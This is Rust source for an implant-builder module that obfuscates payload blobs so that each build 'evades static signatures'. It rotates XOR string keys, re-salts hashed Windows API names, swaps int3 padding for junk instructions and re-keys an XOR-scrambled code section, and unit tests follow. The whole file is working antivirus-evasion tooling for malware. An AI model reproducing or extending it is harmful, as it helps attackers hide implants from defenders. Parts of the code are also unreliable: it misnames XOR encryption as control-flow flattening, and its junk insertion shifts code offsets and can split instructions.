//! Compile-time obfuscation transforms for payload blobs.
//!
//! Each build can apply one or more binary-level transforms to produce a
//! unique implant binary that evades static signatures.

use rand::Rng;
use thiserror::Error;

#[derive(Debug, Error)]
pub enum ObfuscationError {
    #[error("blob too small for obfuscation ({0} bytes)")]
    BlobTooSmall(usize),
    #[error("marker not found: {0}")]
    MarkerNotFound(&'static str),
    #[error("patch overflow at offset {offset:#x}: need {need} bytes, have {have}")]
    PatchOverflow {
        offset: usize,
        need: usize,
        have: usize,
    },
}

// ---------------------------------------------------------------------------
// Markers embedded in the implant binary at compile time
// ---------------------------------------------------------------------------

/// Marker prefixing the encrypted-strings table: "SPECSTR\x00" + 32-byte key.
const STRING_TABLE_MARKER: &[u8; 8] = b"SPECSTR\x00";
/// Marker prefixing the API hash salt: "SPECHASH" + 4-byte salt.
const HASH_SALT_MARKER: &[u8; 8] = b"SPECHASH";

// ---------------------------------------------------------------------------
// Settings
// ---------------------------------------------------------------------------

/// Per-transform toggles and density knobs.
#[derive(Debug, Clone)]
pub struct ObfuscationSettings {
    /// Re-encrypt all embedded strings with a fresh random XOR key.
    pub string_encryption: bool,
    /// Randomize the API hash salt and recompute hash constants.
    pub api_hash_randomization: bool,
    /// Insert junk (NOP-equivalent) instruction sequences between functions.
    pub junk_code_insertion: bool,
    /// Density for junk insertion: average bytes of junk per inter-function gap.
    /// Clamped to 2..=64. Only relevant when `junk_code_insertion` is true.
    pub junk_density: u8,
    /// Apply control-flow flattening (resource-intensive, optional).
    pub control_flow_flattening: bool,
}

impl Default for ObfuscationSettings {
    fn default() -> Self {
        Self {
            string_encryption: true,
            api_hash_randomization: true,
            junk_code_insertion: true,
            junk_density: 16,
            control_flow_flattening: false,
        }
    }
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/// Apply the requested obfuscation transforms to `blob` and return the
/// modified payload. Transforms are applied in a fixed order so that they
/// compose safely:
///
/// 1. String encryption key rotation
/// 2. API hash randomization
/// 3. Junk code insertion
/// 4. Control-flow flattening (if enabled)
pub fn obfuscate(blob: &[u8], settings: &ObfuscationSettings) -> Result<Vec<u8>, ObfuscationError> {
    if blob.len() < 16 {
        return Err(ObfuscationError::BlobTooSmall(blob.len()));
    }

    let mut out = blob.to_vec();
    let mut rng = rand::thread_rng();

    if settings.string_encryption {
        rotate_string_key(&mut out, &mut rng)?;
    }
    if settings.api_hash_randomization {
        randomize_api_hashes(&mut out, &mut rng)?;
    }
    if settings.junk_code_insertion {
        out = insert_junk_code(&out, settings.junk_density, &mut rng);
    }
    if settings.control_flow_flattening {
        apply_control_flow_flattening(&mut out, &mut rng)?;
    }

    Ok(out)
}

// ---------------------------------------------------------------------------
// 1. String encryption key rotation
// ---------------------------------------------------------------------------

/// Locate the string table marker, generate a fresh 32-byte XOR key, and
/// re-encrypt all string entries in-place.
///
/// Binary layout at marker:
///   [SPECSTR\0] (8B)  [old_key] (32B)  [entry_count: u16 LE]  [entries...]
/// Each entry:
///   [len: u16 LE] [encrypted_bytes: len]
fn rotate_string_key(blob: &mut [u8], rng: &mut impl Rng) -> Result<(), ObfuscationError> {
    let marker_pos = find_marker(blob, STRING_TABLE_MARKER)
        .ok_or(ObfuscationError::MarkerNotFound("SPECSTR"))?;

    let key_offset = marker_pos + STRING_TABLE_MARKER.len();
    ensure_range(blob, key_offset, 32)?;

    // Read old key
    let mut old_key = [0u8; 32];
    old_key.copy_from_slice(&blob[key_offset..key_offset + 32]);

    // Generate new key
    let mut new_key = [0u8; 32];
    rng.fill(&mut new_key);

    // Read entry count
    let count_offset = key_offset + 32;
    ensure_range(blob, count_offset, 2)?;
    let entry_count = u16::from_le_bytes([blob[count_offset], blob[count_offset + 1]]) as usize;

    // Re-encrypt each entry: decrypt with old key, encrypt with new key
    let mut cursor = count_offset + 2;
    for _ in 0..entry_count {
        ensure_range(blob, cursor, 2)?;
        let len = u16::from_le_bytes([blob[cursor], blob[cursor + 1]]) as usize;
        cursor += 2;

        ensure_range(blob, cursor, len)?;
        for i in 0..len {
            // XOR decrypt with old key, then XOR encrypt with new key
            blob[cursor + i] ^= old_key[i % 32] ^ new_key[i % 32];
        }
        cursor += len;
    }

    // Patch the key in the blob
    blob[key_offset..key_offset + 32].copy_from_slice(&new_key);

    Ok(())
}

// ---------------------------------------------------------------------------
// 2. API hash randomization
// ---------------------------------------------------------------------------

/// Compute a DJB2-variant hash with the given salt.
fn djb2_hash(name: &[u8], salt: u32) -> u32 {
    let mut h: u32 = 5381u32.wrapping_add(salt);
    for &b in name {
        h = h.wrapping_mul(33).wrapping_add(b as u32);
    }
    h
}

/// Locate the hash-salt marker and the hash table that follows, generate a
/// new random salt, and recompute every hash constant.
///
/// Binary layout at marker:
///   [SPECHASH] (8B)  [salt: u32 LE]  [count: u16 LE]
///   [entries...]: each entry is [hash: u32 LE] [name_len: u8] [name_bytes]
fn randomize_api_hashes(blob: &mut [u8], rng: &mut impl Rng) -> Result<(), ObfuscationError> {
    let marker_pos =
        find_marker(blob, HASH_SALT_MARKER).ok_or(ObfuscationError::MarkerNotFound("SPECHASH"))?;

    let salt_offset = marker_pos + HASH_SALT_MARKER.len();
    ensure_range(blob, salt_offset, 4)?;

    // Generate new salt
    let new_salt: u32 = rng.gen();

    // Read entry count
    let count_offset = salt_offset + 4;
    ensure_range(blob, count_offset, 2)?;
    let entry_count = u16::from_le_bytes([blob[count_offset], blob[count_offset + 1]]) as usize;

    // Recompute each hash with the new salt
    let mut cursor = count_offset + 2;
    for _ in 0..entry_count {
        // Each entry: [hash: u32 LE][name_len: u8][name_bytes]
        ensure_range(blob, cursor, 5)?; // at least hash + name_len
        let name_len = blob[cursor + 4] as usize;
        ensure_range(blob, cursor + 5, name_len)?;

        let name = &blob[cursor + 5..cursor + 5 + name_len];
        let new_hash = djb2_hash(name, new_salt);
        blob[cursor..cursor + 4].copy_from_slice(&new_hash.to_le_bytes());

        cursor += 5 + name_len;
    }

    // Patch the salt
    blob[salt_offset..salt_offset + 4].copy_from_slice(&new_salt.to_le_bytes());

    Ok(())
}

// ---------------------------------------------------------------------------
// 3. Junk code insertion
// ---------------------------------------------------------------------------

/// NOP-equivalent x86-64 instruction templates. Each is a short sequence that
/// has no net effect on registers or memory.
const JUNK_TEMPLATES: &[&[u8]] = &[
    // Single-byte NOP
    &[0x90],
    // 2-byte NOP (66 90)
    &[0x66, 0x90],
    // push rax; pop rax
    &[0x50, 0x58],
    // push rbx; pop rbx
    &[0x53, 0x5B],
    // push rcx; pop rcx
    &[0x51, 0x59],
    // push rdx; pop rdx
    &[0x52, 0x5A],
    // xchg rax, rax (48 87 c0) — 3-byte NOP equivalent
    &[0x48, 0x87, 0xC0],
    // lea rax, [rax+0] (48 8d 40 00)
    &[0x48, 0x8D, 0x40, 0x00],
    // lea rbx, [rbx+0] (48 8d 5b 00)
    &[0x48, 0x8D, 0x5B, 0x00],
    // lea rcx, [rcx+0] (48 8d 49 00)
    &[0x48, 0x8D, 0x49, 0x00],
    // mov rax, rax (48 89 c0)
    &[0x48, 0x89, 0xC0],
    // 3-byte NOP (0F 1F 00)
    &[0x0F, 0x1F, 0x00],
    // 4-byte NOP (0F 1F 40 00)
    &[0x0F, 0x1F, 0x40, 0x00],
    // 5-byte NOP (0F 1F 44 00 00)
    &[0x0F, 0x1F, 0x44, 0x00, 0x00],
];

/// Insert random NOP-equivalent junk sequences at 0xCC (int3) padding
/// boundaries, which typically appear between functions in compiled PIC blobs.
///
/// This modifies the blob size (not in-place) so it must run after any
/// marker-relative transforms.
fn insert_junk_code(blob: &[u8], density: u8, rng: &mut impl Rng) -> Vec<u8> {
    let density = density.clamp(2, 64) as usize;
    let mut out = Vec::with_capacity(blob.len() + blob.len() / 8);

    let mut i = 0;
    while i < blob.len() {
        // Detect inter-function padding: runs of 0xCC (int3) of length >= 2
        if blob[i] == 0xCC && i + 1 < blob.len() && blob[i + 1] == 0xCC {
            // Consume the entire 0xCC run
            let run_start = i;
            while i < blob.len() && blob[i] == 0xCC {
                i += 1;
            }
            let run_len = i - run_start;

            // Generate junk of approximately `density` bytes, but at least as
            // long as the original padding to maintain alignment expectations.
            let target_len = run_len.max(density);
            let junk = generate_junk_sequence(target_len, rng);
            out.extend_from_slice(&junk);
        } else {
            out.push(blob[i]);
            i += 1;
        }
    }

    out
}

/// Build a junk sequence of approximately `target_len` bytes by randomly
/// selecting NOP-equivalent templates.
fn generate_junk_sequence(target_len: usize, rng: &mut impl Rng) -> Vec<u8> {
    let mut seq = Vec::with_capacity(target_len + 8);
    while seq.len() < target_len {
        let template = JUNK_TEMPLATES[rng.gen_range(0..JUNK_TEMPLATES.len())];
        seq.extend_from_slice(template);
    }
    // Trim to exactly target_len by padding with single-byte NOPs or
    // truncating the last template (we only use complete instructions).
    seq.truncate(target_len);
    // If truncation split an instruction, pad the remainder with 0x90.
    while seq.len() < target_len {
        seq.push(0x90);
    }
    seq
}

// ---------------------------------------------------------------------------
// 4. Control-flow flattening (optional, resource-intensive)
// ---------------------------------------------------------------------------

/// Apply basic control-flow flattening by XOR-scrambling code sections with a
/// per-build key and patching the embedded decryption stub to use the new key.
///
/// This is a lightweight variant: the implant's runtime unflattening stub
/// decrypts the code section on first execution. The marker layout is:
///   [SPECFLOW\0] (9B) [key: u32 LE] [code_offset: u32 LE] [code_len: u32 LE]
fn apply_control_flow_flattening(
    blob: &mut [u8],
    rng: &mut impl Rng,
) -> Result<(), ObfuscationError> {
    const CFF_MARKER: &[u8; 9] = b"SPECFLOW\x00";

    let marker_pos = match find_marker(blob, CFF_MARKER) {
        Some(pos) => pos,
        None => {
            // CFF marker is optional — if the implant wasn't compiled with
            // the flattening stub, silently skip.
            return Ok(());
        }
    };

    let meta_offset = marker_pos + CFF_MARKER.len();
    ensure_range(blob, meta_offset, 12)?; // key(4) + offset(4) + len(4)

    let old_key = u32::from_le_bytes([
        blob[meta_offset],
        blob[meta_offset + 1],
        blob[meta_offset + 2],
        blob[meta_offset + 3],
    ]);
    let code_offset = u32::from_le_bytes([
        blob[meta_offset + 4],
        blob[meta_offset + 5],
        blob[meta_offset + 6],
        blob[meta_offset + 7],
    ]) as usize;
    let code_len = u32::from_le_bytes([
        blob[meta_offset + 8],
        blob[meta_offset + 9],
        blob[meta_offset + 10],
        blob[meta_offset + 11],
    ]) as usize;

    ensure_range(blob, code_offset, code_len)?;

    let new_key: u32 = rng.gen();

    // Re-encrypt: XOR with old key to decrypt, then XOR with new key.
    // We operate on 4-byte chunks for the u32 key.
    let old_key_bytes = old_key.to_le_bytes();
    let new_key_bytes = new_key.to_le_bytes();

    for i in 0..code_len {
        blob[code_offset + i] ^= old_key_bytes[i % 4] ^ new_key_bytes[i % 4];
    }

    // Patch the key
    blob[meta_offset..meta_offset + 4].copy_from_slice(&new_key.to_le_bytes());

    Ok(())
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/// Find a byte marker in a blob (first occurrence).
fn find_marker(data: &[u8], marker: &[u8]) -> Option<usize> {
    data.windows(marker.len()).position(|w| w == marker)
}

/// Ensure `blob[offset..offset+len]` is in bounds.
fn ensure_range(blob: &[u8], offset: usize, len: usize) -> Result<(), ObfuscationError> {
    if offset + len > blob.len() {
        return Err(ObfuscationError::PatchOverflow {
            offset,
            need: len,
            have: blob.len().saturating_sub(offset),
        });
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    /// Build a fake blob with a string table marker, one entry, and known key.
    fn make_string_blob() -> Vec<u8> {
        let mut blob = vec![0u8; 64]; // padding
                                      // Marker
        blob.extend_from_slice(STRING_TABLE_MARKER);
        // Key: all 0xAA
        let old_key = [0xAAu8; 32];
        blob.extend_from_slice(&old_key);
        // Entry count: 1
        blob.extend_from_slice(&1u16.to_le_bytes());
        // Entry: len=5, data="hello" XOR'd with key
        blob.extend_from_slice(&5u16.to_le_bytes());
        let plaintext = b"hello";
        for (i, &b) in plaintext.iter().enumerate() {
            blob.push(b ^ old_key[i % 32]);
        }
        blob.extend_from_slice(&[0u8; 32]); // trailing padding
        blob
    }

    /// Build a fake blob with hash-salt marker and two entries.
    fn make_hash_blob() -> Vec<u8> {
        let mut blob = vec![0u8; 32]; // padding
        blob.extend_from_slice(HASH_SALT_MARKER);
        let old_salt: u32 = 0x12345678;
        blob.extend_from_slice(&old_salt.to_le_bytes());
        // 2 entries
        blob.extend_from_slice(&2u16.to_le_bytes());

        // Entry 1: "LoadLibraryA"
        let name1 = b"LoadLibraryA";
        let hash1 = djb2_hash(name1, old_salt);
        blob.extend_from_slice(&hash1.to_le_bytes());
        blob.push(name1.len() as u8);
        blob.extend_from_slice(name1);

        // Entry 2: "GetProcAddress"
        let name2 = b"GetProcAddress";
        let hash2 = djb2_hash(name2, old_salt);
        blob.extend_from_slice(&hash2.to_le_bytes());
        blob.push(name2.len() as u8);
        blob.extend_from_slice(name2);

        blob.extend_from_slice(&[0u8; 32]); // trailing padding
        blob
    }

    #[test]
    fn test_string_key_rotation_changes_key_and_ciphertext() {
        let original = make_string_blob();
        let mut blob = original.clone();
        let mut rng = rand::thread_rng();

        rotate_string_key(&mut blob, &mut rng).unwrap();

        // Key region should have changed
        let key_start = 64 + STRING_TABLE_MARKER.len();
        assert_ne!(
            &blob[key_start..key_start + 32],
            &original[key_start..key_start + 32],
            "key should be different after rotation"
        );

        // Ciphertext should have changed
        let data_start = key_start + 32 + 2 + 2; // key + count + entry_len
        assert_ne!(
            &blob[data_start..data_start + 5],
            &original[data_start..data_start + 5],
            "encrypted string should differ"
        );
    }

    #[test]
    fn test_string_key_rotation_preserves_plaintext() {
        let blob = make_string_blob();
        let mut rotated = blob.clone();
        let mut rng = rand::thread_rng();

        rotate_string_key(&mut rotated, &mut rng).unwrap();

        // Decrypt with new key and verify plaintext matches
        let key_start = 64 + STRING_TABLE_MARKER.len();
        let new_key = &rotated[key_start..key_start + 32];
        let data_start = key_start + 32 + 2 + 2;
        let mut decrypted = rotated[data_start..data_start + 5].to_vec();
        for (i, b) in decrypted.iter_mut().enumerate() {
            *b ^= new_key[i % 32];
        }
        assert_eq!(&decrypted, b"hello");
    }

    #[test]
    fn test_api_hash_randomization_changes_salt_and_hashes() {
        let original = make_hash_blob();
        let mut blob = original.clone();
        let mut rng = rand::thread_rng();

        randomize_api_hashes(&mut blob, &mut rng).unwrap();

        let salt_start = 32 + HASH_SALT_MARKER.len();
        assert_ne!(
            &blob[salt_start..salt_start + 4],
            &original[salt_start..salt_start + 4],
            "salt should change"
        );

        // Hash values should have changed
        let entry_start = salt_start + 4 + 2; // salt + count
        assert_ne!(
            &blob[entry_start..entry_start + 4],
            &original[entry_start..entry_start + 4],
            "first hash should change"
        );
    }

    #[test]
    fn test_api_hash_randomization_recomputes_correctly() {
        let original = make_hash_blob();
        let mut blob = original.clone();
        let mut rng = rand::thread_rng();

        randomize_api_hashes(&mut blob, &mut rng).unwrap();

        // Read the new salt
        let salt_start = 32 + HASH_SALT_MARKER.len();
        let new_salt = u32::from_le_bytes([
            blob[salt_start],
            blob[salt_start + 1],
            blob[salt_start + 2],
            blob[salt_start + 3],
        ]);

        // Verify first entry hash matches expected
        let entry_start = salt_start + 4 + 2;
        let stored_hash = u32::from_le_bytes([
            blob[entry_start],
            blob[entry_start + 1],
            blob[entry_start + 2],
            blob[entry_start + 3],
        ]);
        let expected_hash = djb2_hash(b"LoadLibraryA", new_salt);
        assert_eq!(stored_hash, expected_hash);
    }

    #[test]
    fn test_junk_code_replaces_int3_padding() {
        // Build a blob with an int3 gap in the middle
        let mut blob = vec![0x48; 32]; // fake instructions
        blob.extend_from_slice(&[0xCC; 8]); // inter-function padding
        blob.extend_from_slice(&[0x48; 32]); // more instructions

        let mut rng = rand::thread_rng();
        let result = insert_junk_code(&blob, 16, &mut rng);

        // The 0xCC run should be replaced — no consecutive 0xCC pairs should remain
        let cc_count = result
            .windows(2)
            .filter(|w| w[0] == 0xCC && w[1] == 0xCC)
            .count();
        assert_eq!(cc_count, 0, "int3 padding should be replaced with junk");

        // Original instruction bytes should be preserved
        assert_eq!(&result[..32], &[0x48; 32]);
    }

    #[test]
    fn test_junk_code_no_int3_passthrough() {
        let blob = vec![0x48; 64]; // no int3 padding
        let mut rng = rand::thread_rng();
        let result = insert_junk_code(&blob, 16, &mut rng);
        assert_eq!(result, blob, "blob without int3 gaps should be unchanged");
    }

    #[test]
    fn test_control_flow_flattening() {
        let mut blob = vec![0u8; 32]; // padding
                                      // CFF marker
        blob.extend_from_slice(b"SPECFLOW\x00");
        let old_key: u32 = 0xDEADBEEF;
        blob.extend_from_slice(&old_key.to_le_bytes());
        let code_offset = (blob.len() + 8) as u32; // after len field
        let code_len: u32 = 16;
        blob.extend_from_slice(&code_offset.to_le_bytes());
        blob.extend_from_slice(&code_len.to_le_bytes());

        // Pad to code_offset
        while blob.len() < code_offset as usize {
            blob.push(0x00);
        }

        // "Code section" encrypted with old_key
        let plaintext = b"ABCDEFGHIJKLMNOP"; // 16 bytes
        let old_key_bytes = old_key.to_le_bytes();
        for (i, &b) in plaintext.iter().enumerate() {
            blob.push(b ^ old_key_bytes[i % 4]);
        }
        blob.extend_from_slice(&[0u8; 16]); // trailing padding

        let original = blob.clone();
        let mut rng = rand::thread_rng();
        apply_control_flow_flattening(&mut blob, &mut rng).unwrap();

        // Key should have changed
        let meta_offset = 32 + 9; // padding + marker
        assert_ne!(
            &blob[meta_offset..meta_offset + 4],
            &original[meta_offset..meta_offset + 4],
        );

        // Verify decryption with new key yields original plaintext
        let new_key = u32::from_le_bytes([
            blob[meta_offset],
            blob[meta_offset + 1],
            blob[meta_offset + 2],
            blob[meta_offset + 3],
        ]);
        let new_key_bytes = new_key.to_le_bytes();
        let code_start = code_offset as usize;
        let mut decrypted = vec![0u8; 16];
        for i in 0..16 {
            decrypted[i] = blob[code_start + i] ^ new_key_bytes[i % 4];
        }
        assert_eq!(&decrypted, plaintext);
    }

    #[test]
    fn test_control_flow_flattening_missing_marker_is_ok() {
        let mut blob = vec![0u8; 64];
        let mut rng = rand::thread_rng();
        // Should succeed silently when marker not present
        apply_control_flow_flattening(&mut blob, &mut rng).unwrap();
    }

    #[test]
    fn test_obfuscate_blob_too_small() {
        let blob = vec![0u8; 8];
        let settings = ObfuscationSettings::default();
        let result = obfuscate(&blob, &settings);
        assert!(result.is_err());
    }

    #[test]
    fn test_obfuscate_no_markers_no_int3_passthrough() {
        // A blob with no markers and no int3 — transforms that need markers
        // will fail, but junk insertion on a blob without int3 is a no-op.
        let blob = vec![0x48u8; 128];
        let settings = ObfuscationSettings {
            string_encryption: false,
            api_hash_randomization: false,
            junk_code_insertion: true,
            junk_density: 8,
            control_flow_flattening: false,
        };
        let result = obfuscate(&blob, &settings).unwrap();
        assert_eq!(result, blob);
    }

    #[test]
    fn test_obfuscate_full_pipeline() {
        // Build a blob with both markers
        let mut blob = make_string_blob();
        // Append hash table
        blob.extend_from_slice(HASH_SALT_MARKER);
        let salt: u32 = 0x11111111;
        blob.extend_from_slice(&salt.to_le_bytes());
        blob.extend_from_slice(&1u16.to_le_bytes());
        let name = b"NtAllocateVirtualMemory";
        let hash = djb2_hash(name, salt);
        blob.extend_from_slice(&hash.to_le_bytes());
        blob.push(name.len() as u8);
        blob.extend_from_slice(name);
        // Add some int3 padding
        blob.extend_from_slice(&[0xCC; 16]);
        blob.extend_from_slice(&[0x48; 32]);

        let settings = ObfuscationSettings {
            string_encryption: true,
            api_hash_randomization: true,
            junk_code_insertion: true,
            junk_density: 8,
            control_flow_flattening: false, // no CFF marker in this blob
        };

        let result = obfuscate(&blob, &settings).unwrap();
        assert_ne!(result, blob, "obfuscated blob should differ from original");
    }

    #[test]
    fn test_two_obfuscations_produce_different_output() {
        let blob = make_string_blob();

        let settings = ObfuscationSettings {
            string_encryption: true,
            api_hash_randomization: false,
            junk_code_insertion: false,
            junk_density: 8,
            control_flow_flattening: false,
        };

        let r1 = obfuscate(&blob, &settings).unwrap();
        let r2 = obfuscate(&blob, &settings).unwrap();
        assert_ne!(r1, r2, "two obfuscations should produce unique outputs");
    }

    #[test]
    fn test_generate_junk_sequence_length() {
        let mut rng = rand::thread_rng();
        for target in [4, 8, 16, 32, 64] {
            let seq = generate_junk_sequence(target, &mut rng);
            assert_eq!(seq.len(), target);
        }
    }

    #[test]
    fn test_djb2_hash_deterministic() {
        let h1 = djb2_hash(b"LoadLibraryA", 42);
        let h2 = djb2_hash(b"LoadLibraryA", 42);
        assert_eq!(h1, h2);
    }

    #[test]
    fn test_djb2_hash_different_salts() {
        let h1 = djb2_hash(b"LoadLibraryA", 1);
        let h2 = djb2_hash(b"LoadLibraryA", 2);
        assert_ne!(h1, h2, "different salts should produce different hashes");
    }

    #[test]
    fn test_obfuscation_settings_default() {
        let s = ObfuscationSettings::default();
        assert!(s.string_encryption);
        assert!(s.api_hash_randomization);
        assert!(s.junk_code_insertion);
        assert!(!s.control_flow_flattening);
        assert_eq!(s.junk_density, 16);
    }
}
